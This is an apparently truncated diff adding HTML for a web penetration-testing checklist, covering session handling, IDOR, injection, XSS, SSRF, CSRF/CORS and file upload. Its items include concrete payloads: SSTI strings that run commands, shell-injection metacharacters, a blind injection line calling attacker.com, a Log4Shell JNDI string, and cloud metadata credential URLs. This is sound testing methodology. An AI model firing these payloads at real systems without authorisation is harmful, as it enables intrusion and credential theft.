+        <div><h2 class="mth-phase-title">Session Management</h2><p class="mth-phase-sub">COOKIES · TOKENS · FIXATION · CONCURRENCY · LOGOUT</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">Cookie Flags &amp; Attributes</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Session cookies missing <code>Secure</code> flag — transmitted over plain HTTP</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Session cookies missing <code>HttpOnly</code> flag — accessible via JavaScript (XSS → ATO)</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text"><code>SameSite</code> not set or set to <code>None</code> without <code>Secure</code> — enables CSRF</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Cookie domain scope overly broad — set to <code>.target.com</code> when <code>app.target.com</code> is sufficient</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Session token transmitted in URL — logged in server logs, browser history, Referer headers</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Token Entropy &amp; Predictability</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Session token entropy analysis — sequentially issued or timestamp-based tokens are predictable</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Token length — less than 128 bits of randomness is insufficient for high-value sessions</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Serialised tokens — Java/PHP object serialisation in cookies → deserialization RCE</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Encrypted/signed cookies — test for padding oracle, MAC length extension attacks</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Session Lifecycle</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Session not invalidated server-side after logout — old token still works</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Session not invalidated after password change — existing sessions survive credential change</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Session fixation — server accepts a session ID pre-supplied by the attacker before login</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">New session ID NOT issued after successful login — session ID stays the same pre/post auth</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text">Absolute session timeout — long-lived sessions with no inactivity timeout</span><span class="cl-sev sev-l">Low</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text">Concurrent session limiting — multiple simultaneous sessions from different IPs allowed without notification</span><span class="cl-sev sev-l">Low</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Remember Me &amp; Persistent Auth</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">"Remember me" token stored as plain user ID — guessable / IDOR on persistent auth</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Remember me token not invalidated when password is changed</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Remember me token shared across devices / not device-bound</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="low"><input type="checkbox"><span class="cl-text">Remember me token extremely long expiry (&gt; 30 days) without sliding window</span><span class="cl-sev sev-l">Low</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         06 — AUTHORISATION & IDOR
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-6" data-section="06">
+      <div class="mth-phase-header">
+        <span class="mth-num">06</span>
+        <div><h2 class="mth-phase-title">Authorisation &amp; IDOR</h2><p class="mth-phase-sub">HORIZONTAL · VERTICAL · MULTI-TENANT · BOLA · FORCED BROWSING</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">IDOR / BOLA (Broken Object Level Auth)</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Replace numeric IDs in ALL GET / POST / PUT / DELETE / PATCH requests with another user's ID</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">UUIDs are NOT immune — test UUID substitution across all endpoints</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Test IDs in: URL path, query params, request body, JSON fields, custom HTTP headers</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Indirect object references — email, username, slug used as identifier → substitute other users'</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Autorize (Burp extension) — automatically replay every request with low-privilege session token</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Test DELETE / update operations on objects owned by other users</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Batch/export endpoints — <code>/api/users/export</code> returns all users without ownership check</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Predictable ID patterns — sequential integers, date-based IDs, hash of email/username</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Vertical Privilege Escalation</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Access admin-only endpoints with standard-user session token</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Mass assignment — send undocumented fields: <code>"role":"admin"</code>, <code>"is_admin":true</code>, <code>"premium":true</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Modify JWT role/permission claims to escalate privileges</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">HTTP verb tampering — GET → POST → PUT → DELETE on every endpoint</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text"><code>X-HTTP-Method-Override</code> header to tunnel restricted HTTP verbs through WAF</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">API versioning gaps — auth checks on <code>/api/v3</code> not backported to <code>/api/v1</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Forced browsing — directly access admin paths discovered in JS source</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Multi-Tenant Isolation</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Cross-tenant access — use org/tenant IDs from tenant A in tenant B's authenticated session</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Resource IDs globally sequential vs tenant-scoped — documents, users, settings, billing</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Subdomain-based tenancy — access another tenant's subdomain with your own session</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Query parameter tenancy bypass — <code>?org_id=</code> or <code>?tenant=</code> substitution</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Function-Level Auth (BFLA)</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Admin-only API functions accessible by regular users — role check missing at function level</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Internal / partner API endpoints without auth — not exposed in UI but reachable directly</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">AuthMatrix (Burp extension) — map which roles can access which endpoints systematically</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         07 — INJECTION
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-7" data-section="07">
+      <div class="mth-phase-header">
+        <span class="mth-num">07</span>
+        <div><h2 class="mth-phase-title">Injection</h2><p class="mth-phase-sub">SQLi · SSTI · COMMAND · NoSQL · LDAP · XPATH · CRLF · SSTI</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">SQL Injection (CWE-89)</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Single-quote probe in all params, headers (<code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code>), cookies</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Error-based SQLi — verbose DB errors reveal engine, version, table names</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Blind boolean-based — <code>1=1</code> vs <code>1=2</code> response difference in size/content</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Time-based blind — <code>SLEEP(5)</code> (MySQL), <code>WAITFOR DELAY '0:0:5'</code> (MSSQL), <code>pg_sleep(5)</code> (Postgres)</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">UNION-based extraction — determine column count with <code>ORDER BY</code>, then <code>UNION SELECT</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">OOB via DNS — <code>LOAD_FILE</code>, <code>UTL_HTTP</code>, <code>xp_dirtree</code> with interactsh callback</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Second-order SQLi — value stored then used in later query without re-sanitisation</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">JSON/XML field SQLi — nested input structures often bypass basic parameter sanitisation</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">SQLi in <code>ORDER BY</code> clause — can't use UNION; use time-based blind or error-based instead</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Confirm manually before running SQLMap — avoids false positives and noisy traffic</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">SSTI — Server-Side Template Injection</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Universal probe: <code>{{7*7}}</code>, <code>${{7*7}}</code>, <code>#{7*7}</code>, <code>*{7*7}</code>, <code>{{7*'7'}}</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Jinja2 (Python) — <code>{{config.items()}}</code> → <code>{{''.__class__.__mro__[1].__subclasses__()}}</code> → RCE</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Twig (PHP) — <code>{{_self.env.registerUndefinedFilterCallback("exec")}}</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Freemarker (Java) — <code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id") }</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Pebble / Velocity / Smarty — engine-specific RCE payloads from HackTricks SSTI page</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Test all user-controlled values that appear in rendered HTML output — email subject, name, PDF generation</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Command &amp; Code Injection</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Shell metacharacters: <code>; id</code>, <code>| whoami</code>, <code>&amp;&amp; id</code>, <code>`id`</code>, <code>$(id)</code>, <code>%0a id</code>, <code>%0d%0a id</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Target features: ping utility, DNS lookup tool, file format converter, report generator, image processor</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Blind command injection — OOB via DNS callback: <code>; nslookup $(id).attacker.com</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Code injection — <code>eval()</code>, <code>exec()</code>, <code>system()</code> fed user input without sanitisation</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Path traversal in filenames — <code>../../etc/passwd</code>, URL-encoded variants</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">NoSQL · LDAP · XPATH · CRLF</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">MongoDB operator injection: <code>{"$gt":""}</code>, <code>{"$ne":null}</code>, <code>{"$where":"sleep(1000)"}</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">LDAP injection in login fields: <code>*)(uid=*))(|(uid=*</code>, <code>admin)(&amp;(password=*)</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">XPath injection — <code>' or '1'='1</code>, <code>" or "1"="1</code> in XML-backed data stores</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">CRLF injection — <code>%0d%0a</code> in redirect params / headers → HTTP response splitting, log injection</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Formula injection (CSV export) — <code>=cmd|' /C calc'!A0</code> in user-supplied fields exported to spreadsheets</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Log4Shell / log injection — <code>${jndi:ldap://attacker.com/x}</code> in User-Agent, username, or any logged field</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         08 — XSS & CLIENT-SIDE
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-8" data-section="08">
+      <div class="mth-phase-header">
+        <span class="mth-num">08</span>
+        <div><h2 class="mth-phase-title">XSS &amp; Client-Side Attacks</h2><p class="mth-phase-sub">REFLECTED · STORED · DOM · PROTOTYPE POLLUTION · CLICKJACKING</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">Reflected &amp; Stored XSS</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Reflected XSS in all GET/POST params — test every input context: HTML body, attribute, JS string, URL</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Stored XSS in persistent fields — profile name, bio, comments, address, file names, custom fields</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">XSS in HTTP headers — <code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code> if reflected in admin panels</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Bypass filters — encoding, polyglots, tag breaking, event handler variations, <code>on*=</code> attributes</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">SVG upload XSS — <code>&lt;svg onload="alert(1)"&gt;</code>, embedded <code>&lt;script&gt;</code> tags in SVG files</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Escalate stored XSS to session theft, CSRF bypass, admin panel compromise, or keylogging PoC</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">PDF/docx generation from user input — XSS/SSTI in templates rendered server-side</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">DOM-Based XSS</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Identify dangerous sinks — <code>innerHTML</code>, <code>document.write</code>, <code>eval()</code>, <code>setTimeout(str)</code>, <code>location.href</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Identify sources — <code>document.URL</code>, <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>postMessage</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Hash-based DOM XSS — <code>#&lt;img src=x onerror=alert(1)&gt;</code> not sent to server, bypasses server-side filters</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text"><code>postMessage</code> origin not validated — arbitrary page sends message, app processes it as trusted</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">DOM clobbering — overwrite DOM properties via HTML injection to bypass JS security checks</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Prototype Pollution &amp; Template Injection</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Client-side prototype pollution — <code>?__proto__[evilKey]=payload</code> in query strings processed by JS</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">JSON body prototype pollution — <code>{"__proto__": {"evilKey": "value"}}</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Prototype pollution → XSS — polluted property reaches a DOM sink in the application</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Angular / Vue / React client-side template injection — framework-specific injection patterns</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Clickjacking &amp; UI Redressing</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Missing <code>X-Frame-Options</code> or <code>frame-ancestors</code> CSP directive — page embeddable in iframe</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Clickjacking PoC — overlay transparent iframe over a sensitive action (transfer, delete, confirm)</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Drag-and-drop API abuse — dragging content from sensitive iframed page to attacker-controlled page</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-chain">
+          <span class="cl-chain-label">🔗 Attack Chain — Stored XSS Escalation</span>
+          <div class="cl-chain-steps">
+            <span class="cl-chain-step">Store XSS in profile name</span><span class="cl-chain-arrow">→</span>
+            <span class="cl-chain-step">Admin views user list</span><span class="cl-chain-arrow">→</span>
+            <span class="cl-chain-step">Admin session token stolen</span><span class="cl-chain-arrow">→</span>
+            <span class="cl-chain-step">Admin panel takeover</span><span class="cl-chain-arrow">→</span>
+            <span class="cl-chain-step">All-user data exfil</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         09 — SSRF
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-9" data-section="09">
+      <div class="mth-phase-header">
+        <span class="mth-num">09</span>
+        <div><h2 class="mth-phase-title">Server-Side Request Forgery (SSRF)</h2><p class="mth-phase-sub">OOB · CLOUD METADATA · PROTOCOL SMUGGLING · FILTER BYPASS</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">Basic SSRF Detection</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Test all URL/URI parameters with Burp Collaborator or interactsh callback URL</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Target features: URL preview, webhooks, PDF generators, image fetchers, import-from-URL, XML parsers</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Internal services probe: <code>http://localhost</code>, <code>http://127.0.0.1</code>, <code>http://[::1]</code>, <code>http://0.0.0.0</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">AWS metadata: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">GCP metadata: <code>http://metadata.google.internal/computeMetadata/v1/</code> with <code>Metadata-Flavor: Google</code> header</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Azure metadata: <code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code> with <code>Metadata: true</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Probe internal network ranges: <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code></span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Filter Bypass Techniques</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">IP encoding: decimal <code>2130706433</code>, hex <code>0x7f000001</code>, octal <code>0177.0.0.01</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">IPv6 bypass: <code>http://[::1]</code>, <code>http://[::ffff:127.0.0.1]</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">DNS rebinding — resolve to public IP initially, rebind to 127.0.0.1 after whitelist check</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">URL parser confusion — <code>http://attacker.com@127.0.0.1</code>, <code>http://127.0.0.1#attacker.com</code></span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Open redirect chain: redirect to <code>http://localhost</code> — SSRF via server-side redirect following</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Exotic TLD bypass — DNS name that resolves to 127.0.0.1 (e.g., <code>127.0.0.1.nip.io</code>)</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Protocol Smuggling</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text"><code>file:///etc/passwd</code> — local file read via file:// scheme</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text"><code>gopher://</code> — forge arbitrary TCP payloads: SMTP, Redis, Memcached, internal REST APIs</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text"><code>dict://</code>, <code>ftp://</code>, <code>ldap://</code> — probe for additional internal protocols</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Gopherus — auto-generate gopher payloads for Redis, FastCGI, MySQL, SMTP attacks via SSRF</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">IMDSv2 token fetch — test if IMDSv2 is enforced or if IMDSv1 still works on AWS EC2</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         10 — CSRF & CORS
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-10" data-section="10">
+      <div class="mth-phase-header">
+        <span class="mth-num">10</span>
+        <div><h2 class="mth-phase-title">CSRF, CORS &amp; Open Redirects</h2><p class="mth-phase-sub">STATE-CHANGING REQUESTS · ORIGIN VALIDATION · REDIRECT BYPASS</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">CSRF</p>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Every state-changing POST/PUT/PATCH/DELETE request checked for CSRF token</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">CSRF token absent — build minimal HTML PoC form and confirm exploitation</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">CSRF token reusable — same token works across multiple requests</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">CSRF token tied to session or per-request? Session-tied tokens are weaker</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">JSON CSRF — change <code>Content-Type</code> to <code>text/plain</code> with body as raw JSON, confirm server accepts</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">SameSite=None without Secure flag — cookies sent in cross-origin requests</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Login CSRF — attacker-initiated login binds victim to attacker's account (credential fixation)</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">CORS Misconfiguration</p>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text"><code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code> — ATO via CORS</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Origin reflection — server mirrors attacker origin + <code>Allow-Credentials: true</code></span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Null origin — <code>Origin: null</code> accepted with credentials (sandbox iframe exploit)</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Weak origin regex — <code>target.com.attacker.com</code> or <code>attackertarget.com</code> passes validation</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Subdomain CORS trust — any subdomain origin allowed, XSS on any subdomain → CORS exploit</span><span class="cl-sev sev-h">High</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Pre-flight bypass — simple requests (GET with simple headers) skip pre-flight entirely</span><span class="cl-sev sev-m">Med</span></label>
+        </div>
+        <div class="cl-group">
+          <p class="cl-group-label">Open Redirects</p>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Test all <code>redirect</code>, <code>return</code>, <code>next</code>, <code>url</code>, <code>goto</code>, <code>dest</code>, <code>destination</code>, <code>continue</code> parameters</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Bypass: <code>//attacker.com</code>, <code>////attacker.com</code>, <code>/\attacker.com</code>, backslash, tab, newline characters</span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="med"><input type="checkbox"><span class="cl-text">Credential bypass: <code>https://target.com@attacker.com</code></span><span class="cl-sev sev-m">Med</span></label>
+          <label class="cl-item" data-sev="crit"><input type="checkbox"><span class="cl-text">Chain open redirect with OAuth <code>redirect_uri</code> → steal auth codes / access tokens</span><span class="cl-sev sev-c">Crit</span></label>
+          <label class="cl-item" data-sev="high"><input type="checkbox"><span class="cl-text">Header-based redirects — <code>Location</code> header injection via CRLF in input that reaches response headers</span><span class="cl-sev sev-h">High</span></label>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         11 — FILE UPLOAD & XXE
+    ══════════════════════════════════════════════ -->
+    <div class="mth-phase reveal" id="cl-11" data-section="11">
+      <div class="mth-phase-header">
+        <span class="mth-num">11</span>
+        <div><h2 class="mth-phase-title">File Upload &amp; XXE</h2><p class="mth-phase-sub">WEBSHELL · MIME BYPASS · ZIP SLIP · POLYGLOT · XML ENTITIES</p></div>
+      </div>
+      <div class="cl-grid">
+        <div class="cl-group">
+          <p class="cl-group-label">File Upload Abuse</p>
